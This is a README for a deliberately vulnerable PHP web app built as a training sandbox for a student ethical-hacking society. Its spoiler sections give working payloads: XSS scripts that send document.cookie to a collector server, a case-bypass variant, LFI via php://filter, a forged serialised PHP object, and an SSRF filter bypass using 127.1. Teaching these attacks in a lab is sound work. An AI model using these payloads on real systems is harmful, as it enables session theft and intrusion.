# Web-Hacking-Demo
A web application hacking sandbox challenge for [Sheffield Ethical Student Hackers](https://shefesh.com). Covering insecure deserialisation, SSRF, XSS, and more

## Setup

Install mysql: `sudo apt install mysql-server php-mysql`

Start service: `sudo systemctl start mysql.service`

Configure: `sudo mysql; CREATE USER 'sesh'@'localhost' IDENTIFIED BY 'SESHPassword123!';`

Seed: `mysql -u sesh -p < seed.sql`

Launch: `php -S localhost:8000`

## Login

`sesh_admin`:`mylongpassword123?`

## Exploit XSS

The `/reviews` page allows posting reviews. Click one of the sublinks to render the reviews using different levels of user input sanitisation, and see if you can steal an admin cookie.

NOTE: you will need to login as an admin and visit the reviews page in a new browser session (try an incognito tab) and refresh the page after you submit your XSS payload for this to work.

<details>

<summary>Spoilers</summary>

For the unsanitised version, you can create an XHR or fetch request to steal a cookie:

`<script>cookie = document.cookie; fetch('http://localhost:8001/?cookie=' + cookie).then(response => response.json()).then(data => console.log(data));</script>`

For the sanitised version, script and iframe tags are removed. You can use uppercase SCRIPT tags:

`<SCRIPT>cookie = document.cookie; fetch('http://localhost:8001/?cookie=' + cookie).then(response => response.json()).then(data => console.log(data));</SCRIPT>`

Or use an img:

`<img src=x onerror="this.src='http://localhost:8001/?'+document.cookie; this.removeAttribute('onerror');">`

</details>

## Exploit Deserialisation

The Recipes section has a deserialisation vulnerability that allows reading a secret recipe that would normally be encrypted. This challenge was repurposed from last year's CTF.

<details>

<summary>Spoilers</summary>

Read the source code for the `get-recipe.php` and `create-recipe.php` files using the LFI in the first form field (submit `../get-recipe.php` etc).

This shows us how to submit a new secret recipe: `http://[URL]/create-recipe.php?recipe_recipe=O:12:%22SecretRecipe%22:4:{s:9:%22encrypted%22;b:0;s:5:%22title%22;s:4:%22Test%22;s:8:%22contents%22;s:4:%22Test%22;s:2:%22id%22;i:1;}`

This string defines a serialised `SecretRecipe` instance that references the secret recipe we want to steal from the database, but sets `encrypted` to false.

We can then use the ID given to us by the application and submit it to the "Construct Recipe from String in Database" field, where it is deserialised: `http://localhost:8000/get-recipe.php?recipe=&id=&string_id=[ID]`.

</details>

## Exploit File Inclusion

There is a file inclusion vulnerability on `/recipe-hash`

<details>

<summary>Spoilers</summary>

The `recipe-hash.php` file has an `include` statement that includes the contents of the `?hash=` parameter.

To read the config file:

`http://[URL]/recipe-hash.php?hash_input=hello&hash=php://filter/convert.base64-encode/resource=config.php`

</details>

## Exploit Server-Side Request Forgery (SSRF)

Try to use `/page-viewer.php` to view the `/local-only.php` page.

<details>

<summary>Spoilers</summary>

There is an SSRF on `/page-viewer.php` which has a badly implemented filter.

The phrases `127.0.0.1` and `localhost` are blocked, but an alternative can be used such as `127.1`:

`http://127.1:8000/local-only.php`

</details>